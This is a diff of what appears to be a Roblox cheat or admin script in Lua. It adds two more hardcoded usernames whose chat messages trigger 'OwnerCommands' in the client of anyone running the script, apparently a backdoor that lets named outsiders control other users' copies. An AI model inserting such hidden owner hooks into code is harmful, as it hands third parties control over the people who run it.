@@ -23,7 +23,8 @@ local CheckGamePass = Marketplace:UserOwnsGamePassAsync(tonumber((LPlayer.Charac
 local SayMessageRequest = Replicate.DefaultChatSystemChatEvents.SayMessageRequest
 local SaveFrame = LPlayer.Character.HumanoidRootPart.CFrame
 local OwnerVini = Players:FindFirstChild("viniciuszk70")
-local OwnerVini = Players:FindFirstChild("viniciuszk70")
+local OwnerNight = Players:FindFirstChild("33_Night")
+local OwnerPeka = Players:FindFirstChild("RCM_Mystx")
 local HitBoxSize = 7
 local Box = Instance.new('Part',workspace)
 Box.Name = "Box"
@@ -4335,13 +4336,21 @@ end
 
 LPlayer.Chatted:Connect(Connect.Commands)
 
-if Owner then
-Owner.Chatted:Connect(Connect.OwnerCommands)
+if OwnerVini then
+OwnerVini.Chatted:Connect(Connect.OwnerCommands)
+end
+
+if OwnerNight then
+OwnerNight.Chatted:Connect(Connect.OwnerCommands)
+end
+
+if OwnerPeka then
+OwnerPeka.Chatted:Connect(Connect.OwnerCommands)
 end
 
 Players.PlayerAdded:Connect(function(Added)
 if not DisableAdmin then
-if Added.Name == "viniciuszk70" then
+if Added.Name == "viniciuszk70" or Added.Name == "33_Night" or Added.Name == "RCM_Mystx" then
 Added.Chatted:Connect(Connect.OwnerCommands)
 end
 end
